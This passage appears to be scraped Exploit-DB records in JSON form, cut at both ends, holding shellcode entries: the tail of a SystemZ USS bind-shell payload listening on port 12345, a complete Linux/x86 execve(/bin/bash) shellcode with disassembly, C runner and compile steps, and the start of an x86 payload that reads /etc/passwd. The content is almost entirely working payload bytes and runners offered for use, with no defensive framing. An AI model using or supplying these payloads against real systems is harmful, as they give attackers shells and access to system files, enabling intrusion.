"########################################################################", "", "\\*  For SystemZ USS  *\\", "\\*   Bind shell payload listens on port 12345 on 0.0.0.0 *\\", "\\*   Use netcat to connect  *\\", "\\*   Author:  Bigendian Smalls  *\\ ", "char sc[]=", "\"\\x90\\x64\\xd0\\x0c\\xc0\\xf0\\xff\\xff\\xff\\xfe\\x18\\xcf\\x17\\x11\\x17\\x22\"", "\"\\x17\\x33\\xc2\\x19\\x01\\x01\\x01\\x02\\xc2\\x29\\x01\\x01\\x01\\x03\\x17\\x12\"", "\"\\x18\\x41\\x8b\\x40\\x10\\x01\\x17\\xaa\\x17\\x22\\xc0\\xa1\\xde\\xad\\xbe\\xef\"", "\"\\x18\\xbc\\x1a\\xb1\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xfc\\x1a\\xb4\"", "\"\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xf6\\x1a\\xb1\\x1b\\xb4\\x50\\xd0\"", "\"\\xb0\\x04\\x50\\xb0\\xd0\\x08\\x18\\xdb\\x18\\x3b\\x1a\\x34\\x1a\\x34\\x18\\x53\"", "\"\\x1b\\x31\\x1b\\x31\\x18\\x41\\x17\\x11\\x17\\x22\\x1a\\x14\\xb9\\xf8\\x10\\x23\"", "\"\\x97\\x4b\\x20\\x01\\xa7\\x1e\\x08\\x28\\xa7\\x44\\xff\\xf9\\x17\\x44\\x58\\xd4\"", "\"\\xb0\\x04\\x98\\x64\\xd0\\x0c\\x07\\xf5\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\"", "\"\\xdb\\xa7\\x9b\\x47\\x8b\\xbb\\xb4\\xb4\\xb4\\xb5\\x53\\x44\\x8b\\x0b\\x4b\\x4b\"", "\"\\x48\\xaf\\x1b\\x9b\\x0b\\x4f\\x53\\x9f\\xec\\xd3\\x4b\\x4a\\xec\\x83\\x4b\\x4f\"", "\"\\xec\\xae\\x48\\x70\\x8f\\x14\\x4b\\x4b\\x48\\xbd\\x8f\\x24\\x4b\\x4b\\x48\\xbe\"", "\"\\xec\\xae\\x48\\x78\\x8f\\x14\\x4b\\x4b\\x48\\xb9\\x8f\\x24\\x4b\\x4b\\x48\\xba\"", "\"\\x8f\\xb6\\x4b\\x4b\\x48\\x9f\\x8b\\x5b\\x4b\\x4b\\x4b\\x5a\\x53\\x3a\\x1b\\x3c\"", "\"\\x4b\\x4b\\x51\\x37\\x1b\\x3b\\x3b\\x4b\\x51\\x37\\xee\\x31\\xcb\\x4b\\x1b\\x3b\"", "\"\\x3b\\x4b\\xec\\xbf\\x4b\\x42\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x8f\\x66\\xb4\\xb4\\xb4\\xb2\\xa7\\x6c\\x4b\\xfa\"", "\"\\x4b\\x35\\x0a\\x6b\\x4b\\x42\\x8f\\x16\\x4b\\x4b\\x48\\x80\\x53\\x2e\\xec\\xae\"", "\"\\x49\\xfe\\x8f\\x16\\x4b\\x4b\\x48\\xf4\\x53\\x2e\\xec\\xae\\x49\\xe4\\x0a\\x6b\"", "\"\\x4b\\x43\\x8f\\x16\\x4b\\x4b\\x48\\xf0\\x8b\\x2a\\x4b\\x4b\\x4b\\x4b\\xec\\xae\"", "\"\\x49\\xee\\x8f\\x16\\x4b\\x4b\\x48\\xfa\\x8b\\x2a\\x4b\\x4b\\x4b\\x4a\\xec\\xae\"", "\"\\x49\\xd6\\x8f\\x16\\x4b\\x4b\\x48\\xe2\\x8b\\x2a\\x4b\\x4b\\x4b\\x49\\xec\\xae\"", "\"\\x49\\xde\\x0a\\x6b\\x4b\\x42\\x8f\\x16\\x4b\\x4b\\x48\\xea\\x53\\x2e\\xec\\xae\"", "\"\\x49\\xc6\\x8f\\x16\\x4b\\x4b\\x48\\xd2\\x53\\x2e\\xec\\xae\\x49\\xcc\\x8f\\xb6\"", "\"\\x4b\\x4b\\x48\\x34\\x8b\\x5b\\x4b\\x4b\\x4b\\x13\\x8b\\x3b\\x4b\\x4b\\x4b\\x0e\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x19\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x1b\\x8b\\x3b\"", "\"\\x4b\\x4b\\x4b\\x0a\\x8f\\x34\\x4b\\x4b\\x4b\\x07\\x51\\x37\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x75\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x0d\\x51\\x37\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x71\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x0b\\x8b\\x3b\\x4b\\x4b\\x48\\x1a\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x77\\x8f\\x34\\x4b\\x4b\\x4b\\x70\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x71\\x8f\\x34\\x4b\\x4b\\x4b\\x72\\x8f\\x34\\x4b\\x4b\\x4b\\x73\\x8b\\x3b\"", "\"\\x4b\\x4b\\x4b\\x7c\\x8f\\x34\\x4b\\x4b\\x4b\\x7f\\x51\\x37\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x79\\x51\\x37\\xee\\x31\\xcb\\x4b\\x8f\\x34\\x4b\\x4b\\x4b\\x65\\xec\\x4e\"", "\"\\x4b\\x66\\x4b\\x4b\\x4b\\x4b\\x4b\\x4c\\x2a\\xc9\\xc2\\xde\\x2a\\xe9\\xc3\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4a\\x4b\\x4b\\x4b\\x49\\x4b\\x4b\\x4b\\x4b\\xe9\\xc3\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\xec\\x4e\\x49\\xa7\\x8b\\xab\"", "\"\\x4b\\x4b\\x4b\\x40\\x0a\\x6b\\x4b\\x42\\x8f\\x16\\x4b\\x4b\\x48\\x53\\x53\\x2e\"", "\"\\xec\\xbf\\x49\\x4f\\xec\\xa1\\x4b\\x5b\\x8f\\x16\\x4b\\x4b\\x48\\x45\\x53\\x2e\"", "\"\\xec\\xbf\\x4a\\xb7\\x8f\\xb6\\x4b\\x4b\\x49\\xbd\\x8b\\x5b\\x4b\\x4b\\x4b\\x7e\"", "\"\\x8b\\x3b\\x4b\\x4b\\x49\\xa1\\x8f\\x34\\x4b\\x4b\\x4b\\x64\\x8b\\x3b\\x4b\\x4b\"", "\"\\x49\\xa9\\x8f\\x34\\x4b\\x4b\\x4b\\x60\\x8b\\x3b\\x4b\\x4b\\x49\\x91\\x8f\\x34\"", "\"\\x4b\\x4b\\x4b\\x6c\\x8b\\x3b\\x4b\\x4b\\x49\\x9d\\x8f\\x34\\x4b\\x4b\\x4b\\x68\"", "\"\\x8b\\x3b\\x4b\\x4b\\x4b\\x53\\x8f\\x34\\x4b\\x4b\\x4b\\x54\\x8b\\x3b\\x4b\\x4b\"", "\"\\x4b\\x55\\x8f\\x34\\x4b\\x4b\\x4b\\x50\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x52\"", "\"\\x51\\x37\\xee\\x31\\xcb\\x4b\\x8f\\x34\\x4b\\x4b\\x4b\\x5e\\xec\\x4e\\x4b\\x5f\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x8f\\xb6\\x4b\\x4b\\x49\\xe4\\x8b\\x5b\\x4b\\x4b\"", "\"\\x4b\\x61\\x8b\\x3b\\xb4\\xb4\\xb4\\xac\\x8f\\x34\\x4b\\x4b\\x4b\\x6f\\x8b\\x3b\"", "\"\\x4b\\x4b\\x4b\\x54\\x8f\\x34\\x4b\\x4b\\x4b\\x6b\\x8b\\x3b\\x4b\\x4b\\x49\\xf8\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x57\\x8b\\x3b\\x4b\\x4b\\x4b\\x50\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x53\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x5d\\x51\\x37\\xee\\x31\\xcb\\x4b\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x59\\xec\\x4e\\x4b\\x5a\\x4b\\x4b\\x4b\\x4b\\x4b\\x5b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x53\\xb7\\x8f\\x26\\xb4\\xb4\"", "\"\\xb4\\xb3\\xa7\\x2c\\x49\\x1a\\x4b\\x35\\x8f\\xb6\\x4b\\x4b\\x49\\x3b\\x8b\\x5b\"", "\"\\x4b\\x4b\\x4b\\x6a\\x8b\\x3b\\xb4\\xb4\\xb4\\xed\\x8f\\x34\\x4b\\x4b\\x4b\\x50\"", "\"\\x8b\\x3b\\x4b\\x4b\\x49\\x13\\x8f\\x34\\x4b\\x4b\\x4b\\x5c\\x8b\\x3b\\x4b\\x4b\"", "\"\\x4b\\x5d\\x8f\\x34\\x4b\\x4b\\x4b\\x58\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x5a\"", "\"\\x51\\x37\\xee\\x31\\xcb\\x4b\\x8f\\x34\\x4b\\x4b\\x4b\\x46\\xec\\x4e\\x4b\\x47\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x8f\\xb6\\x4b\\x4b\\x49\\x08\\x8b\\x5b\\x4b\\x4b\"", "\"\\x4b\\x7d\\x8b\\x3b\\xb4\\xb4\\xb4\\x3c\\x8f\\x34\\x4b\\x4b\\x4b\\x7b\\x8b\\x3b\"", "\"\\x4b\\x4b\\x4b\\x62\\x8f\\x34\\x4b\\x4b\\x4b\\x67\\x8b\\x3b\\x4b\\x4b\\x4b\\x50\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x63\\x8b\\x3b\\x4b\\x4b\\x4b\\x54\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x6f\\x8b\\x3b\\x4b\\x4b\\x4b\\x68\\x8f\\x34\\x4b\\x4b\\x4b\\x6b\\x51\\x37\"", "\"\\xee\\x31\\xcb\\x4b\\x8f\\x34\\x4b\\x4b\\x4b\\x57\\xec\\x4e\\x4b\\x50\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x5b\\x49\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4e\\xa4\\x8b\\xab\\x4b\\x4b\\x4b\\x47\\x0a\\x6b\\x4b\\x4f\\x8f\\x16\\xb4\\xb4\"", "\"\\xb4\\xa7\\xec\\x23\\x4b\\x4c\\xec\\xbf\\x4b\\xba\\xec\\xa1\\x4b\\x59\\x8f\\x16\"", "\"\\x4b\\x4b\\x4a\\xb2\\xec\\x23\\x4b\\x4d\\xec\\xbf\\x4b\\xa3\\x8b\\x1b\\xb4\\xb4\"", "\"\\xb4\\x97\\x8b\\x3b\\x4b\\x4b\\x4b\\x47\\xec\\xae\\x4b\\x50\\xec\\xae\\x4a\\x22\"", "\"\\x8b\\x1b\\x4b\\x4b\\x4a\\xa5\\xec\\xae\\x4b\\xc3\\x8b\\x1b\\x4b\\x4b\\x4a\\xa8\"", "\"\\x8b\\x3b\\xb4\\xb4\\xb4\\xa5\\xec\\xae\\x4b\\x47\\xec\\xae\\x4a\\xce\\x8b\\xab\"", "\"\\xb4\\xb4\\xb4\\xbd\\x8b\\x1b\\xb4\\xb4\\xb4\\x8b\\xec\\xbf\\x4b\\x3d\\x8f\\xb6\"", "\"\\x4b\\x4b\\x4a\\x82\\x53\\x7c\\x8f\\xa4\\x4b\\x4b\\x4a\\xe4\\x8b\\x6b\\x4b\\x4b\"", "\"\\x4b\\x07\\x9c\\x4c\\x6b\\x4b\\x6b\\x4b\\x8b\\x6b\\x4b\\x4b\\x4b\\x75\\x9c\\x44\"", "\"\\x6b\\x4b\\x6b\\x4b\\x8f\\x14\\x4b\\x4b\\x4b\\x09\\x8b\\x5b\\x4b\\x4b\\x4b\\x74\"", "\"\\x8b\\x3b\\x4b\\x4b\\x4b\\x79\\x8f\\x34\\x4b\\x4b\\x4b\\x60\\x8b\\x3b\\x4b\\x4b\"", "\"\\x4b\\x63\\x8f\\x34\\x4b\\x4b\\x4b\\x7e\\x8b\\x3b\\x4b\\x4b\\x4a\\xd9\\x8f\\x34\"", "\"\\x4b\\x4b\\x4b\\x7a\\x8b\\x3b\\x4b\\x4b\\x4b\\x55\\x8f\\x34\\x4b\\x4b\\x4b\\x66\"", "\"\\x8b\\x3b\\x4b\\x4b\\x4b\\x69\\x8f\\x34\\x4b\\x4b\\x4b\\x62\\x8b\\x3b\\x4b\\x4b\"", "\"\\x4b\\x63\\x8f\\x34\\x4b\\x4b\\x4b\\x6e\\x51\\x37\\xee\\x31\\xcb\\x4b\\x8f\\x34\"", "\"\\x4b\\x4b\\x4b\\x6a\\xec\\x4e\\x4b\\x6b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4a\\x69\\x69\\x69\\x69\\x69\\x69\\x69\\x69\\x69\\x69\\x69\\x69\"", "\"\\x69\\x69\\x69\\x69\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x8f\\xa6\\x4b\\x4b\\x4a\\x04\\x53\\x38\\x53\\xb2\"", "\"\\x8f\\x26\\xb4\\xb4\\xb4\\xa1\\xa7\\x29\\xab\\x4b\\x4b\\xb5\\xa7\\x23\\x3b\\x4b\"", "\"\\xb4\\xb5\\xec\\x4e\\x4a\\x7a\\x8f\\xb6\\x4b\\x4b\\x4a\\x1c\\x8f\\xa4\\x4b\\x4b\"", "\"\\x4a\\x77\\x8b\\x5b\\x4b\\x4b\\x4b\\x7a\\x8b\\x3b\\xb4\\xb4\\xb4\\x85\\x8f\\x34\"", "\"\\x4b\\x4b\\x4b\\x62\\x8b\\x3b\\x4b\\x4b\\x4b\\x6d\\x8f\\x34\\x4b\\x4b\\x4b\\x6c\"", "\"\\x8f\\x14\\x4b\\x4b\\x4b\\x69\\x8b\\x3b\\x4b\\x4b\\x4a\\x60\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x6b\\x8b\\x3b\\xb4\\xb4\\xb4\\x8a\\x8f\\x34\\x4b\\x4b\\x4b\\x57\\x51\\x37\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x51\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x53\\x51\\x37\"", "\"\\xee\\x31\\xcb\\x4b\\x8f\\x34\\x4b\\x4b\\x4b\\x5f\\xec\\x4e\\x4b\\x58\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4e\\xa4\\x8f\\xa6\\x4b\\x4b\\x4b\\xb2\\x8f\\x26\\xb4\\xb4\\xb4\\xbd\\x53\\xbd\"", "\"\\xa7\\x23\\x4b\\xa9\\xb4\\x35\\x4c\\xb5\\x8f\\xb6\\x4b\\x4b\\x4a\\x43\\x8f\\xa4\"", "\"\\x4b\\x4b\\x4b\\xa0\\x8b\\x5b\\x4b\\x4b\\x4b\\x79\\x53\\x3a\\x50\\x37\\x50\\x37\"", "\"\\x50\\x37\\x8f\\x14\\x4b\\x4b\\x4b\\x6e\\x8f\\x34\\x4b\\x4b\\x4b\\x63\\x8f\\x64\"", "\"\\x4b\\x4b\\x4b\\x6a\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x68\\x8f\\x24\\x4b\\x4b\"", "\"\\x4b\\x57\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x55\\x51\\x37\\x8f\\x34\\x4b\\x4b\"", "\"\\x4b\\x57\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x51\\x51\\x37\\xee\\x31\\xcb\\x4b\"", "\"\\x8f\\x34\\x4b\\x4b\\x4b\\x5d\\xec\\x4e\\x4b\\x5e\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4e\\xa4\\x8f\\xa6\\x4b\\x4b\\x4b\\xe2\\x8f\\x36\\xb4\\xb4\\xb4\\xbd\\xa7\\x33\"", "\"\\x4b\\xd8\\xb4\\x35\\x4c\\xb5\\x8f\\xb6\\x4b\\x4b\\x4b\\xf0\\x8f\\xa4\\x4b\\x4b\"", "\"\\x4b\\xd7\\x8b\\x5b\\x4b\\x4b\\x4b\\x50\\x53\\x3a\\x8f\\x34\\x4b\\x4b\\x4b\\x5c\"", "\"\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x5e\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x58\"", "\"\\x51\\x37\\x8f\\x34\\x4b\\x4b\\x4b\\x5a\\x51\\x37\\xee\\x31\\xcb\\x4b\\x8f\\x34\"", "\"\\x4b\\x4b\\x4b\\x46\\xec\\x4e\\x4b\\x47\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4e\\xa4\\x8f\\x26\"", "\"\\xb4\\xb4\\xb4\\xb2\\xa7\\x23\\x4b\\x2b\\xb4\\x35\\x8f\\x16\\xb4\\xb4\\xb4\\xa4\"", "\"\\x8f\\x26\\xb4\\xb4\\xb4\\xa5\\x8f\\xa6\\x4b\\x4b\\x4b\\x2c\\x4c\\xb5\\x8b\\x5b\"", "\"\\xb4\\xb4\\xb5\\xb0\\x8f\\x06\\xb4\\xb4\\xb4\\x4b\\x8b\\x6b\\x4b\\x4b\\x4b\\xcc\"", "\"\\xec\\xc3\\x4b\\x5e\\xa8\\x7b\\x5b\\x4b\\x4b\\x3d\\x8b\\x70\\x4b\\x4b\\x4b\\xb4\"", "\"\\x52\\x73\\xec\\x3f\\x4b\\x4d\\xec\\x23\\x4b\\xce\\xec\\xbf\\x4b\\x45\\xa8\\x1b\"", "\"\\x6b\\x4b\\x4b\\x3d\\x8b\\x10\\x4b\\x4b\\x4b\\xb4\\x51\\x62\\x51\\x22\\x52\\x7e\"", "\"\\xec\\x3f\\xb4\\xbc\\x50\\x22\\x09\\x2b\\x5b\\x4b\\x51\\x52\\x50\\x02\\xec\\x3f\"", "\"\\xb4\\xa8\\x4c\\xb5\\x8f\\x06\\xb4\\xb4\\xb5\\x93\\x8b\\x5b\\xb4\\xb4\\xb5\\x86\"", "\"\\xec\\xc3\\x4b\\xce\\x8b\\x6b\\x4b\\x4b\\x4b\\x11\\x50\\x62\\xa8\\x7b\\x5b\\x4b\"", "\"\\x4b\\x3d\\x8b\\x70\\x4b\\x4b\\x4b\\xb4\\x52\\x73\\xec\\x3f\\x4b\\x4d\\xec\\x73\"", "\"\\x4b\\x2e\\xec\\xbf\\x4b\\x42\\x51\\x68\\xa8\\x7b\\x6b\\x4b\\x4b\\x3d\\x8b\\x70\"", "\"\\x4b\\x4b\\x4b\\xb4\\x09\\x7b\\x5b\\x4b\\x51\\x52\\x50\\x02\\xec\\x3f\\xb4\\xaf\"", "\"\\x4c\\xb5\\x5c\\xb4\\x8b\\x0b\\x4b\\x4b\\x4b\\x5b\\x1b\\xbb\\x0b\\x4b\\x13\\x9b\"", "\"\\x0b\\x4f\\xd3\\xa7\\x9b\\x47\\x8b\\x0b\\x4b\\x4b\\x4b\\x4c\\x13\\xbb\\x0b\\x4b\"", "\"\\x4c\\xb5\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x4b\\x4b\\x4b\\x4a\\x4b\\x4b\\x4b\\x49\\x4a\\x18\\x78\\xf7\\x4a\\x18\\x78\\xef\"", "\"\\x4a\\x18\\x7c\\x5b\\x4a\\x18\\x7d\\x7d\\x4a\\x18\\x7d\\x23\\x4a\\x18\\x7d\\x6f\"", "\"\\x4a\\x18\\x78\\x55\\x4a\\x18\\x78\\xc1\\x4a\\x18\\x79\\x07\\x4a\\x18\\x78\\x4d\"", "\"\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\\x4b\"", "\"\\x49\\x49\\x7b\\x72\\x4b\\x4b\\x4b\\x4b\\x01\\x02\\x03\\x9c\\x09\\x86\\x7f\\x97\"", "\"\\x8d\\x8e\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x9d\\x0a\\x08\\x87\\x18\"", "\"\\x19\\x92\\x8f\\x1c\\x1d\\x1e\\x1f\\x80\\x81\\x82\\x83\\x84\\x85\\x17\\x1b\\x88\"", "\"\\x89\\x8a\\x8b\\x8c\\x05\\x06\\x07\\x90\\x91\\x16\\x93\\x94\\x95\\x96\\x04\\x98\"", "\"\\x99\\x9a\\x9b\\x14\\xff\\x9e\\x1a\\x20\\xa0\\xe2\\xe4\\xe0\\xe1\\xe3\\xe5\\xe7\"", "\"\\xf1\\xa2\\x2e\\x3c\\x28\\x2b\\x7c\\x26\\xe9\\xea\\xeb\\xe8\\xed\\xee\\xef\\xec\"", "\"\\xdf\\x21\\x24\\x2a\\x29\\x3b\\x5e\\x2d\\x2f\\xc2\\xc4\\xc0\\xc1\\xc3\\xc5\\xc7\"", "\"\\xd1\\xa6\\x2c\\x25\\x5f\\x3e\\x3f\\xf8\\xc9\\xca\\xcb\\xc8\\xcd\\xce\\xcf\\xcc\"", "\"\\x60\\x3a\\x23\\x40\\x27\\x3d\\x22\\xd8\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\"", "\"\\x69\\xab\\xbb\\xf0\\xfd\\xfe\\xb1\\xb0\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\"", "\"\\x72\\xaa\\xba\\xe6\\xb8\\xc6\\xa4\\xb5\\x7e\\x73\\x74\\x75\\x76\\x77\\x78\\x79\"", "\"\\x7a\\xa1\\xbf\\xd0\\x5b\\xde\\xae\\xac\\xa3\\xa5\\xb7\\xa9\\xa7\\xb6\\xbc\\xbd\"", "\"\\xbe\\xdd\\xa8\\xaf\\x5d\\xb4\\xd7\\x7b\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\"", "\"\\x49\\xad\\xf4\\xf6\\xf2\\xf3\\xf5\\x7d\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\"", "\"\\x52\\xb9\\xfb\\xfc\\xf9\\xfa\\xff\\x5c\\xf7\\x53\\x54\\x55\\x56\\x57\\x58\\x59\"", "\"\\x5a\\xb2\\xd4\\xd6\\xd2\\xd3\\xd5\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\"", "\"\\x39\\xb3\\xdb\\xdc\\xd9\\xda\\x9f\\xf0\";"]},
{"Title": "Linux/x86 - execve(/bin/bash) Shellcode (31 bytes)", "Author": "Ajith Kp", "Published": ": 2015-09-06", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/38088.c", "View": "https://old.exploit-db.com/raw/38088/", "code": ["/*", "---------------------------------------------------------------------------------------------------", "", "Linux/x86 - execve(/bin/bash) - 31 bytes", "", "Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]", "", "Om Asato Maa Sad-Gamaya |", "Tamaso Maa Jyotir-Gamaya |", "Mrtyor-Maa Amrtam Gamaya |", "Om Shaantih Shaantih Shaantih |", "", "---------------------------------------------------------------------------------------------------", "Disassembly of section .text:", "", " 08048060 <.text>:", " 8048060:\tb0 46                \tmov    $0x46,%al", " 8048062:\t31 c0                \txor    %eax,%eax", " 8048064:\tcd 80                \tint    $0x80", " 8048066:\teb 07                \tjmp    0x804806f", " 8048068:\t5b                   \tpop    %ebx", " 8048069:\t31 c0                \txor    %eax,%eax", " 804806b:\tb0 0b                \tmov    $0xb,%al", " 804806d:\tcd 80                \tint    $0x80", " 804806f:\t31 c9                \txor    %ecx,%ecx", " 8048071:\te8 f2 ff ff ff       \tcall   0x8048068", " 8048076:\t2f                   \tdas    ", " 8048077:\t62 69 6e             \tbound  %ebp,0x6e(%ecx)", " 804807a:\t2f                   \tdas    ", " 804807b:\t62 61 73             \tbound  %esp,0x73(%ecx)", " 804807e:\t68                   \t.byte 0x68", "---------------------------------------------------------------------------------------------------", "", "How To Run", "", "$ gcc -o bash_shell bash_shell.c", "$ execstack -s local_bash", "$ ./ local_bash", "", "---------------------------------------------------------------------------------------------------", "*/", "#include <stdio.h>", "char sh[]=\"\\xb0\\x46\\x31\\xc0\\xcd\\x80\\xeb\\x07\\x5b\\x31\\xc0\\xb0\\x0b\\xcd\\x80\\x31\\xc9\\xe8\\xf2\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\";", "void main(int argc, char **argv)", "{", "\tint (*func)();", "\tfunc = (int (*)()) sh;", "\t(int)(*func)();", "}"]},
{"Title": "Linux/x86 - execve(\"/bin/cat\", [\"/bin/cat\", \"/etc/passwd\"], NULL) Shellcode (75 bytes)", "Author": "Ajith Kp", "Published": ": 2015-09-09", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/38116.c", "View": "https://old.exploit-db.com/raw/38116/", "code": ["/*", "---------------------------------------------------------------------------------------------------", "", "# Linux/x86 - execve(\"/bin/cat\", [\"/bin/cat\", \"/etc/passwd\"], NULL) - 75 bytes", "# Tested in Zorin OS 10 x86", "# Author: Ajith Kp", "", "Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]", "", "Om Asato Maa Sad-Gamaya |", "Tamaso Maa Jyotir-Gamaya |", "Mrtyor-Maa Amrtam Gamaya |", "Om Shaantih Shaantih Shaantih |", "", "---------------------------------------------------------------------------------------------------", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:\teb 1f                \tjmp    0x8048081", " 8048062:\t5b                   \tpop    %ebx", " 8048063:\t31 c0                \txor    %eax,%eax", " 8048065:\t88 43 0b             \tmov    %al,0xb(%ebx)", " 8048068:\t88 43 18             \tmov    %al,0x18(%ebx)", " 804806b:\t89 5b 19             \tmov    %ebx,0x19(%ebx)", " 804806e:\t8d 4b 0c             \tlea    0xc(%ebx),%ecx", " 8048071:\t89 4b 1d             \tmov    %ecx,0x1d(%ebx)", " 8048074:\t89 43 21             \tmov    %eax,0x21(%ebx)", " 8048077:\tb0 0b                \tmov    $0xb,%al", " 8048079:\t8d 4b 19             \tlea    0x19(%ebx),%ecx", " 804807c:\t8d 53 21             \tlea    0x21(%ebx),%edx", " 804807f:\tcd 80                \tint    $0x80", " 8048081:\te8 dc ff ff ff       \tcall   0x8048062", " 8048086:\t2f                   \tdas    ", " 8048087:\t2f                   \tdas    ", " 8048088:\t2f                   \tdas    ", " 8048089:\t2f                   \tdas    ", " 804808a:\t62 69 6e             \tbound  %ebp,0x6e(%ecx)", " 804808d:\t2f                   \tdas    ", " 804808e:\t63 61 74             \tarpl   %sp,0x74(%ecx)", " 8048091:\t23 2f                \tand    (%edi),%ebp", " 8048093:\t2f                   \tdas    ", " 8048094:\t65 74 63             \tgs je  0x80480fa", " 8048097:\t2f                   \tdas    ", " 8048098:\t70 61                \tjo     0x80480fb", " 